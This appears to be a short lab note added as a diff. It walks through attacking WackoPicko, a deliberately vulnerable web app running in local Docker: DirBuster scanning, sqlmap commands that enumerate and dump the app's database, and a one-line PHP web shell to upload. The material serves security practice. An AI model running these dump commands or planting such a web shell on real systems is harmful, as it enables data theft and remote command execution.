@@ -1,0 +1,22 @@
+# Run WackoPicko
+docker run -p 127.0.0.1:8080:80 -it adamdoupe/wackopicko
+
+# Run DirBuster
+docker run --rm hypnza/dirbuster -u http://172.17.0.2
+
+# Try SqlMap
+docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url 172.17.0.2/users/login.php 
+--data "username=one&password=two" --method POST --dbs --batch
+ 
+Found any DB?
+
+# Try dumping it
+ docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url 172.17.0.2/users/login.php 
+--data "username=one&password=two" --method POST --dbs --batch -D wackopicko --dump all
+
+
+
+# And uploads?
+Try this approach:
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+
